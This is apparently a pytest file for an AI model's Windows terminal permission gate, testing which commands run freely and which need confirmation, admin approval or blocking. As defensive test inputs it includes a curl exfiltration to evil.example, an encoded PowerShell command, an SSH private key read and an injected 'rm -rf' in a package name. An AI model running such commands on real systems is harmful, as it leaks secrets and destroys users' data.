"""The read-only command classifier is an allowlist; anything unclear must ask."""

import pytest

from assistant.permissions.gate import ConfirmChoice, Task
from assistant.permissions.pathrules import PathNormalizer
from assistant.permissions.policy import Risk
from assistant.tools.terminal import classify

NORM = PathNormalizer("windows", env={"USERPROFILE": "C:\\Users\\Sam"}, resolver=None)


@pytest.mark.parametrize("cmd", [
    "Get-ChildItem C:\\Users\\Sam\\Documents", "ipconfig /all", "Get-Process | Sort-Object CPU | Select-Object -First 5",
    "Get-Date", "systeminfo", "Get-Content ~\\notes.txt", "whoami", "Get-Volume | Format-Table",
    "Get-ChildItem $env:USERPROFILE\\Desktop",
])
def test_read_only_powershell(cmd):
    c = classify(cmd, "powershell", NORM)
    assert c.read_only, (cmd, c.reason)
    assert c.capability == "terminal.read"


@pytest.mark.parametrize("cmd, why", [
    ("Remove-Item C:\\x -Recurse", "may change"),
    ("Get-ChildItem > out.txt", "redirects"),
    ("Get-Process | Stop-Process", "may change"),
    ("echo $(Remove-Item x)", "sub-expression"),
    ("Get-ChildItem | ForEach-Object { Remove-Item $_ }", "script block"),
    ("[IO.File]::WriteAllText('x','y')", ".NET"),
    ("iex (gc evil.ps1)", "other code"),
    ("Get-Content $profile", "variables"),
    ("ipconfig /release", "options"),
    ("Get-ChildItem C:\\Users\\*\\.ssh", "wildcards"),
    ("Get-Ch`ildItem", "escape"),
    ("powershell -enc ZQBjAGgAbwA=", "encoded"),
    ("Start-Process notepad", "other code"),
    ("gci; del x", "may change"),
])
def test_changes_need_confirmation(cmd, why):
    c = classify(cmd, "powershell", NORM)
    assert not c.read_only and c.capability == "terminal.run" and Risk.TERMINAL_CHANGE in c.risks
    assert why in c.reason, c.reason


def test_network_installs_and_admin():
    assert classify("curl https://evil.example/?d=secret", "powershell", NORM).capability == "terminal.run"
    assert classify("Test-Connection 8.8.8.8", "powershell", NORM).reason == "uses the network"
    c = classify("winget install Spotify.Spotify", "powershell", NORM)
    assert c.capability == "software.install" and Risk.INSTALL in c.risks
    c = classify("Start-Process cmd -Verb RunAs", "powershell", NORM)
    assert c.capability == "system.admin" and Risk.ADMIN in c.risks


def test_cmd_rules():
    assert classify("dir C:\\Users", "cmd", NORM).read_only
    assert classify("date /t", "cmd", NORM).read_only
    assert not classify("date 01-01-2020", "cmd", NORM).read_only
    assert not classify("dir & del x", "cmd", NORM).read_only
    assert not classify("echo hi > C:\\x.txt", "cmd", NORM).read_only
    assert not classify("type x ^| more", "cmd", NORM).read_only


def test_run_command_flow(ts):
    system, platform, conf, home = ts
    res = system.invoke("run_command", {"command": "Get-Date"}, Task())
    assert res.ok and res.untrusted and conf.requests == []           # read-only: no question
    system.invoke("run_command", {"command": "Remove-Item x"}, Task())
    req = conf.requests[-1]
    assert req.action.details[0] == "PS> Remove-Item x" and not req.allow_task
    conf.choice = ConfirmChoice.DENY
    n = len(platform.shell.commands)
    assert not system.invoke("run_command", {"command": "Stop-Computer"}, Task()).ok
    assert len(platform.shell.commands) == n                        # denied -> never executed


def test_read_only_command_touching_blocked_folder_is_blocked(ts):
    system, platform, conf, home = ts
    (home / ".ssh").mkdir()
    from assistant.permissions.policy import Access

    system.policy.set_folder(str(home / ".ssh"), Access.NONE)
    system.reload_policy()
    res = system.invoke("run_command", {"command": f"Get-Content {home}/.ssh/id_rsa"}, Task())
    assert not res.ok and "Blocked" in res.text and platform.shell.commands == []


def test_winget_requires_exact_id_and_confirmation(ts):
    system, platform, conf, home = ts
    assert system.invoke("winget", {"action": "search", "package": "spotify"}, Task()).ok
    assert conf.requests == []
    r = system.invoke("winget", {"action": "install", "package": "spotify; rm -rf"}, Task())
    assert not r.ok and "exact" in r.text
    system.invoke("winget", {"action": "install", "package": "Spotify.Spotify"}, Task())
    assert conf.requests[-1].action.risks == {Risk.INSTALL}
    assert platform.shell.commands[-1][1].startswith("winget install --id Spotify.Spotify --exact")


def test_admin_always_confirms(ts):
    system, platform, conf, home = ts
    system.invoke("run_as_admin", {"command": "Restart-Service Spooler"}, Task())
    assert conf.requests[-1].action.risks == {Risk.ADMIN}
    assert platform.shell.commands[-1] == ("admin", "Restart-Service Spooler")
